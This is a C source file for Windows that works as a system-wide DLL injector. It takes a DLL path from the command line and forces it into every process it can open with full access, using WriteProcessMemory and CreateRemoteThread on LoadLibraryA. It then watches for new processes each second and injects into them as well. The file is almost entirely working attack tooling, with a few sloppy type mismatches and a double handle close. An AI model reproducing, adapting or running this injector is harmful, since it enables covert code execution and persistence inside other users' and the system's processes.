#include "stdio.h"
#include "Windows.h"
#include "tlhelp32.h"
#include "tchar.h"
#include "wchar.h"

// Structure to hold process information
typedef struct {
    DWORD pid;
    char name[MAX_PATH];
} ProcessInfo;

// Function to get the list of running processes
void getRunningProcesses(ProcessInfo** processes, int* count) {
    *count = 0;
    *processes = NULL;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Failed to create snapshot\n");
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        printf("Failed to get first process\n");
        return;
    }

    int capacity = 10;
    *processes = (ProcessInfo*)malloc(sizeof(ProcessInfo) * capacity);

    do {
        ProcessInfo info;
        info.pid = pe.th32ProcessID;
        strcpy_s(info.name, MAX_PATH, pe.szExeFile);

        if (*count >= capacity) {
            capacity *= 2;
            *processes = (ProcessInfo*)realloc(*processes, sizeof(ProcessInfo) * capacity);
        }

        (*processes)[(*count)++] = info;
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);
}

// Forward declarations
HANDLE findProcess(WCHAR* processName);
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath);
void printError(TCHAR* msg);
BOOL loop = FALSE;
// Main
int wmain(int argc, wchar_t* argv[]) {
    const char dllPath[MAX_PATH];
    wcstombs(dllPath, argv[1], MAX_PATH);

    // Enumerate all processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("[---] Could not create snapshot.\n");
        return 1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        printError(TEXT("Process32First"));
        CloseHandle(hProcessSnap);
        return 1;
    }

    do {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        if (hProcess != NULL) {
            BOOL injectSuccessful = loadRemoteDLL(hProcess, dllPath);
            if (injectSuccessful) {
                printf("[+] DLL injection successful into process %s\n", pe32.szExeFile);
            }
            else {
                printf("[---] DLL injection failed into process %s\n", pe32.szExeFile);
            }
            CloseHandle(hProcess);
        }

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);



    // Get initial list of processes
    ProcessInfo* initialProcesses = NULL;
    int initialCount = 0;
    getRunningProcesses(&initialProcesses, &initialCount);

    while (1) {
        // Get current list of processes
        ProcessInfo* currentProcesses = NULL;
        int currentCount = 0;
        getRunningProcesses(&currentProcesses, &currentCount);

        // Find new processes
        for (int i = 0; i < currentCount; i++) {
            int found = 0;
            for (int j = 0; j < initialCount; j++) {
                if (currentProcesses[i].pid == initialProcesses[j].pid) {
                    found = 1;
                    break;
                }
            }
            if (!found) {
                printf("New process created: %s (PID: %d)\n", currentProcesses[i].name, currentProcesses[i].pid);
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, currentProcesses[i].pid);
                if (hProcess != NULL) {
                    BOOL injectSuccessful = loadRemoteDLL(hProcess, dllPath);
                    if (injectSuccessful) {
                        printf("[+] DLL injection successful into process %s\n", currentProcesses[i].name);
                    }
                    else {
                        printf("[---] DLL injection failed into process %s\n", currentProcesses[i].name);
                    }
                    CloseHandle(hProcess);
                }
            }
        }

        // Update initial list
        free(initialProcesses);
        initialProcesses = currentProcesses;
        initialCount = currentCount;

        Sleep(1000); // Check every second
    }


}

/* Look for the process in memory
* Walks through snapshot of processes in memory, compares with command line argument
* Modified from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
*/
HANDLE findProcess(WCHAR* processName) {
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("[---] Could not create snapshot.\n");
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32)) {
        printError(TEXT("Process32First"));
        CloseHandle(hProcessSnap);
        return FALSE;
    }

    // Now walk the snapshot of processes, and
    // display information about each process in turn
    do {
        if (!wcscmp(pe32.szExeFile, processName)) {
            wprintf(L"[+] The process %s was found in memory.\n", pe32.szExeFile);

            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                return hProcess;
            }
            else {
                printf("[---] Failed to open process %s.\n", pe32.szExeFile);
                return NULL;
            }
        }

    } while (Process32Next(hProcessSnap, &pe32));

    printf("[---] %s has not been loaded into memory, aborting.\n", processName);
    return NULL;
}

/* Load DLL into remote process
* Gets LoadLibraryA address from current process, which is guaranteed to be same for single boot session across processes
* Allocated memory in remote process for DLL path name
* CreateRemoteThread to run LoadLibraryA in remote process. Address of DLL path in remote memory as argument
*/
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath) {

    // Allocate memory for DLL's path name to remote process
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("[---] VirtualAllocEx unsuccessful.\n");
        printError(TEXT("VirtualAllocEx"));
        return FALSE;
    }

    // Write DLL's path name to remote process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);

    if (!succeededWriting) {
        printf("[---] WriteProcessMemory unsuccessful.\n");
        printError(TEXT("WriteProcessMemory"));
        return FALSE;
    }
    else {
        // Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
        LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
        if (loadLibraryAddress == NULL) {
            printf("[---] LoadLibrary not found in process.\n");
            printError(TEXT("GetProcAddress"));
            return FALSE;
        }
        else {
            HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
            if (remoteThread == NULL) {
                printf("[---] CreateRemoteThread unsuccessful.\n");
                printError(TEXT("CreateRemoteThread"));
                return FALSE;
            }
        }
    }

    CloseHandle(hProcess);
    return TRUE;
}

/* Prints error message
* Taken from https://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx
*/
void printError(TCHAR* msg) {
    DWORD eNum;
    TCHAR sysMsg[256];
    TCHAR* p;

    eNum = GetLastError();
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, eNum,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
        sysMsg, 256, NULL);

    // Trim the end of the line and terminate it with a null
    p = sysMsg;
    while ((*p > 31) || (*p == 9))
        ++p;
    do { *p-- = 0; } while ((p >= sysMsg) &&
        ((*p == '.') || (*p < 33)));

    // Display the message
    printf("[---] %s failed with error %d (%s) \n", msg, eNum, sysMsg);
}